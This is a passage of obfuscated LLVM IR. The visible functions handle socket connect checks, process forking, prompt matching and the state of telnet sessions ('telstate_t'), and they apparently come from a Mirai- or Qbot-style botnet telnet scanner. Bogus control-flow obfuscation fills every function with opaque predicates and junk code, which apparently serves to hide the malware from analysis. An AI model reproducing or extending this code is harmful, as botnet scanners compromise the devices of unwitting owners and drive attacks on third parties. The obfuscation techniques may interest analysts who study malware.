  %56 = icmp eq i32 %55, 115
  %57 = load i32, i32* @x.55
  %58 = load i32, i32* @y.56
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %153

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #5, !srcloc !4
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* @x.55
  %81 = load i32, i32* @y.56
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = load i32, i32* %6, align 4
  %89 = srem i32 %88, 64
  %90 = zext i32 %89 to i64
  %91 = shl i64 1, %90
  %92 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %93 = load i32, i32* %6, align 4
  %94 = sdiv i32 %93, 64
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [16 x i64], [16 x i64]* %92, i64 0, i64 %95
  %97 = load i64, i64* %96, align 8
  %98 = or i64 %97, %91
  store i64 %98, i64* %96, align 8
  %99 = load i32, i32* %6, align 4
  %100 = add nsw i32 %99, 1
  %101 = call i32 @select(i32 %100, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %102 = icmp sgt i32 %101, 0
  %103 = load i32, i32* @x.55
  %104 = load i32, i32* @y.56
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart248, label %originalBB1alteredBB

originalBBpart248:                                ; preds = %originalBB1
  br i1 %102, label %111, label %135

; <label>:111:                                    ; preds = %originalBBpart248
  store i32 4, i32* %13, align 4
  %112 = load i32, i32* %6, align 4
  %113 = bitcast i32* %14 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %13) #5
  %115 = load i32, i32* %14, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %164

; <label>:118:                                    ; preds = %111
  %119 = load i32, i32* @x.55
  %120 = load i32, i32* @y.56
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %118
  %127 = load i32, i32* @x.55
  %128 = load i32, i32* @y.56
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %136

; <label>:135:                                    ; preds = %originalBBpart248
  store i32 0, i32* %5, align 4
  br label %164

; <label>:136:                                    ; preds = %originalBBpart252
  %137 = load i32, i32* @x.55
  %138 = load i32, i32* @y.56
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %136
  %145 = load i32, i32* @x.55
  %146 = load i32, i32* @y.56
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %154

; <label>:153:                                    ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %164

; <label>:154:                                    ; preds = %originalBBpart256
  br label %155

; <label>:155:                                    ; preds = %154, %37
  %156 = load i32, i32* %6, align 4
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %156, i32 3, i8* null)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %15, align 8
  %159 = load i64, i64* %15, align 8
  %160 = and i64 %159, -2049
  store i64 %160, i64* %15, align 8
  %161 = load i32, i32* %6, align 4
  %162 = load i64, i64* %15, align 8
  %163 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i64 %162)
  store i32 1, i32* %5, align 4
  br label %164

; <label>:164:                                    ; preds = %155, %153, %135, %117, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %45
  %166 = call i32* @__errno_location() #13
  %167 = load i32, i32* %166, align 4
  %168 = icmp eq i32 %167, 115
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  %169 = load i32, i32* %6, align 4
  %_ = sub i32 0, %169
  %gen = add i32 %_, 64
  %_2 = sub i32 %169, 64
  %gen3 = mul i32 %_2, 64
  %_4 = sub i32 0, %169
  %gen5 = add i32 %_4, 64
  %_6 = sub i32 0, %169
  %gen7 = add i32 %_6, 64
  %_8 = shl i32 %169, 64
  %_9 = sub i32 0, %169
  %gen10 = add i32 %_9, 64
  %_11 = sub i32 0, %169
  %gen12 = add i32 %_11, 64
  %_13 = shl i32 %169, 64
  %170 = srem i32 %169, 64
  %171 = zext i32 %170 to i64
  %_14 = sub i64 1, %171
  %gen15 = mul i64 %_14, %171
  %_16 = shl i64 1, %171
  %_17 = sub i64 1, %171
  %gen18 = mul i64 %_17, %171
  %_19 = sub i64 1, %171
  %gen20 = mul i64 %_19, %171
  %_21 = sub i64 0, 1
  %gen22 = add i64 %_21, %171
  %_23 = shl i64 1, %171
  %_24 = shl i64 1, %171
  %_25 = sub i64 1, %171
  %gen26 = mul i64 %_25, %171
  %172 = shl i64 1, %171
  %173 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %174 = load i32, i32* %6, align 4
  %_27 = sub i32 %174, 64
  %gen28 = mul i32 %_27, 64
  %_29 = sub i32 %174, 64
  %gen30 = mul i32 %_29, 64
  %_31 = shl i32 %174, 64
  %_32 = sub i32 %174, 64
  %gen33 = mul i32 %_32, 64
  %175 = sdiv i32 %174, 64
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds [16 x i64], [16 x i64]* %173, i64 0, i64 %176
  %178 = load i64, i64* %177, align 8
  %_34 = sub i64 %178, %172
  %gen35 = mul i64 %_34, %172
  %_36 = shl i64 %178, %172
  %179 = or i64 %178, %172
  store i64 %179, i64* %177, align 8
  %180 = load i32, i32* %6, align 4
  %_37 = shl i32 %180, 1
  %_38 = sub i32 %180, 1
  %gen39 = mul i32 %_38, 1
  %_40 = sub i32 0, %180
  %gen41 = add i32 %_40, 1
  %_42 = shl i32 %180, 1
  %_43 = sub i32 0, %180
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %180, 1
  %gen46 = mul i32 %_45, 1
  %181 = add nsw i32 %180, 1
  %182 = call i32 @select(i32 %181, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %183 = icmp sgt i32 %182, 0
  br label %originalBB1

originalBB50alteredBB:                            ; preds = %originalBB50, %118
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %136
  br label %originalBB54
}

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %79

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @x.57
  %12 = load i32, i32* @y.58
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i64, i64* @numpids, align 8
  %20 = add i64 %19, 1
  store i64 %20, i64* @numpids, align 8
  %21 = load i64, i64* @numpids, align 8
  %22 = add i64 %21, 1
  %23 = mul i64 %22, 4
  %24 = call noalias i8* @malloc(i64 %23) #5
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %26 = load i32, i32* @x.57
  %27 = load i32, i32* @y.58
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart239, %originalBBpart2
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %69

; <label>:40:                                     ; preds = %34
  %41 = load i32*, i32** @pids, align 8
  %42 = load i32, i32* %4, align 4
  %43 = zext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  %45 = load i32, i32* %44, align 4
  %46 = load i32*, i32** %3, align 8
  %47 = load i32, i32* %4, align 4
  %48 = zext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 %45, i32* %49, align 4
  br label %50

; <label>:50:                                     ; preds = %40
  %51 = load i32, i32* @x.57
  %52 = load i32, i32* @y.58
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %50
  %59 = load i32, i32* %4, align 4
  %60 = add i32 %59, 1
  store i32 %60, i32* %4, align 4
  %61 = load i32, i32* @x.57
  %62 = load i32, i32* @y.58
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart239, label %originalBB32alteredBB

originalBBpart239:                                ; preds = %originalBB32
  br label %34

; <label>:69:                                     ; preds = %34
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #5
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %8
  %80 = load i32, i32* %1, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %10
  %81 = load i64, i64* @numpids, align 8
  %_ = sub i64 %81, 1
  %gen = mul i64 %_, 1
  %_1 = sub i64 %81, 1
  %gen2 = mul i64 %_1, 1
  %_3 = sub i64 %81, 1
  %gen4 = mul i64 %_3, 1
  %_5 = shl i64 %81, 1
  %_6 = sub i64 0, %81
  %gen7 = add i64 %_6, 1
  %82 = add i64 %81, 1
  store i64 %82, i64* @numpids, align 8
  %83 = load i64, i64* @numpids, align 8
  %_8 = sub i64 %83, 1
  %gen9 = mul i64 %_8, 1
  %_10 = sub i64 0, %83
  %gen11 = add i64 %_10, 1
  %_12 = sub i64 %83, 1
  %gen13 = mul i64 %_12, 1
  %_14 = shl i64 %83, 1
  %_15 = sub i64 0, %83
  %gen16 = add i64 %_15, 1
  %84 = add i64 %83, 1
  %_17 = sub i64 0, %84
  %gen18 = add i64 %_17, 4
  %_19 = sub i64 %84, 4
  %gen20 = mul i64 %_19, 4
  %_21 = shl i64 %84, 4
  %_22 = sub i64 %84, 4
  %gen23 = mul i64 %_22, 4
  %_24 = shl i64 %84, 4
  %_25 = sub i64 0, %84
  %gen26 = add i64 %_25, 4
  %_27 = sub i64 0, %84
  %gen28 = add i64 %_27, 4
  %_29 = sub i64 0, %84
  %gen30 = add i64 %_29, 4
  %_31 = shl i64 %84, 4
  %85 = mul i64 %84, 4
  %86 = call noalias i8* @malloc(i64 %85) #5
  %87 = bitcast i8* %86 to i32*
  store i32* %87, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB32alteredBB:                            ; preds = %originalBB32, %50
  %88 = load i32, i32* %4, align 4
  %_33 = sub i32 %88, 1
  %gen34 = mul i32 %_33, 1
  %_35 = sub i32 %88, 1
  %gen36 = mul i32 %_35, 1
  %_37 = shl i32 %88, 1
  %89 = add i32 %88, 1
  store i32 %89, i32* %4, align 4
  br label %originalBB32
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart243, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %164

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %106, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %104

; <label>:22:                                     ; preds = %18
  %23 = load i32, i32* @x.59
  %24 = load i32, i32* @y.60
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8*, i8** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = load i32, i32* %7, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 0, %36
  %38 = getelementptr inbounds i8, i8* %34, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = icmp eq i32 %40, 0
  %42 = load i32, i32* @x.59
  %43 = load i32, i32* @y.60
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %41, label %86, label %50

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %86, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %86, label %74

; <label>:74:                                     ; preds = %62
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 10
  br label %86

; <label>:86:                                     ; preds = %74, %62, %50, %originalBBpart2
  %87 = phi i1 [ true, %62 ], [ true, %50 ], [ true, %originalBBpart2 ], [ %85, %74 ]
  %88 = load i32, i32* @x.59
  %89 = load i32, i32* @y.60
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %86
  %96 = load i32, i32* @x.59
  %97 = load i32, i32* @y.60
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %104

; <label>:104:                                    ; preds = %originalBBpart29, %18
  %105 = phi i1 [ false, %18 ], [ %87, %originalBBpart29 ]
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %104
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  br label %18

; <label>:109:                                    ; preds = %104
  %110 = load i32, i32* @x.59
  %111 = load i32, i32* @y.60
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %109
  %118 = load i8*, i8** %3, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i32, i32* %7, align 4
  %123 = sext i32 %122 to i64
  %124 = sub i64 0, %123
  %125 = getelementptr inbounds i8, i8* %121, i64 %124
  %126 = load i8, i8* %125, align 1
  %127 = sext i8 %126 to i32
  %128 = load i8*, i8** %4, align 8
  %129 = load i32, i32* %6, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = icmp eq i32 %127, %133
  %135 = load i32, i32* @x.59
  %136 = load i32, i32* @y.60
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart227, label %originalBB11alteredBB

originalBBpart227:                                ; preds = %originalBB11
  br i1 %134, label %143, label %144

; <label>:143:                                    ; preds = %originalBBpart227
  store i32 1, i32* %2, align 4
  br label %165

; <label>:144:                                    ; preds = %originalBBpart227
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* @x.59
  %147 = load i32, i32* @y.60
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %145
  %154 = load i32, i32* %6, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %6, align 4
  %156 = load i32, i32* @x.59
  %157 = load i32, i32* @y.60
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart243, label %originalBB29alteredBB

originalBBpart243:                                ; preds = %originalBB29
  br label %11

; <label>:164:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %165

; <label>:165:                                    ; preds = %164, %143
  %166 = load i32, i32* %2, align 4
  ret i32 %166

originalBBalteredBB:                              ; preds = %originalBB, %22
  %167 = load i8*, i8** %3, align 8
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %167, i64 %169
  %171 = load i32, i32* %7, align 4
  %172 = sext i32 %171 to i64
  %_ = sub i64 0, 0
  %gen = add i64 %_, %172
  %_1 = sub i64 0, %172
  %gen2 = mul i64 %_1, %172
  %_3 = shl i64 0, %172
  %_4 = shl i64 0, %172
  %_5 = sub i64 0, 0
  %gen6 = add i64 %_5, %172
  %173 = sub i64 0, %172
  %174 = getelementptr inbounds i8, i8* %170, i64 %173
  %175 = load i8, i8* %174, align 1
  %176 = sext i8 %175 to i32
  %177 = icmp eq i32 %176, 0
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %86
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %109
  %178 = load i8*, i8** %3, align 8
  %179 = load i32, i32* %5, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8, i8* %178, i64 %180
  %182 = load i32, i32* %7, align 4
  %183 = sext i32 %182 to i64
  %_12 = sub i64 0, %183
  %gen13 = mul i64 %_12, %183
  %_14 = shl i64 0, %183
  %_15 = shl i64 0, %183
  %_16 = sub i64 0, 0
  %gen17 = add i64 %_16, %183
  %_18 = sub i64 0, 0
  %gen19 = add i64 %_18, %183
  %_20 = sub i64 0, 0
  %gen21 = add i64 %_20, %183
  %_22 = sub i64 0, 0
  %gen23 = add i64 %_22, %183
  %_24 = sub i64 0, 0
  %gen25 = add i64 %_24, %183
  %184 = sub i64 0, %183
  %185 = getelementptr inbounds i8, i8* %181, i64 %184
  %186 = load i8, i8* %185, align 1
  %187 = sext i8 %186 to i32
  %188 = load i8*, i8** %4, align 8
  %189 = load i32, i32* %6, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8, i8* %188, i64 %190
  %192 = load i8, i8* %191, align 1
  %193 = sext i8 %192 to i32
  %194 = icmp eq i32 %187, %193
  br label %originalBB11

originalBB29alteredBB:                            ; preds = %originalBB29, %145
  %195 = load i32, i32* %6, align 4
  %_30 = sub i32 %195, 1
  %gen31 = mul i32 %_30, 1
  %_32 = shl i32 %195, 1
  %_33 = sub i32 %195, 1
  %gen34 = mul i32 %_33, 1
  %_35 = sub i32 %195, 1
  %gen36 = mul i32 %_35, 1
  %_37 = shl i32 %195, 1
  %_38 = sub i32 %195, 1
  %gen39 = mul i32 %_38, 1
  %_40 = sub i32 0, %195
  %gen41 = add i32 %_40, 1
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %6, align 4
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %28

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.61
  %9 = load i32, i32* @y.62
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %17 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 8
  %19 = call i32 @close(i32 %18)
  %20 = load i32, i32* @x.61
  %21 = load i32, i32* @y.62
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart2, %2
  %29 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 7
  store i32 0, i32* %30, align 8
  %31 = load i32, i32* %4, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i32 0, i32 2
  store i8 %32, i8* %34, align 8
  %35 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i32 0, i32 9
  %37 = load i8*, i8** %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 512, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %38 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 8
  %41 = call i32 @close(i32 %40)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = load i32, i32* @x.63
  %3 = load i32, i32* @y.64
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %10, align 8
  %11 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  call void @advance_state(%struct.telstate_t* %11, i32 0)
  %12 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  %13 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %12, i32 0, i32 3
  store i8 1, i8* %13, align 1
  %14 = load i32, i32* @x.63
  %15 = load i32, i32* @y.64
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %22 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %22, align 8
  %23 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
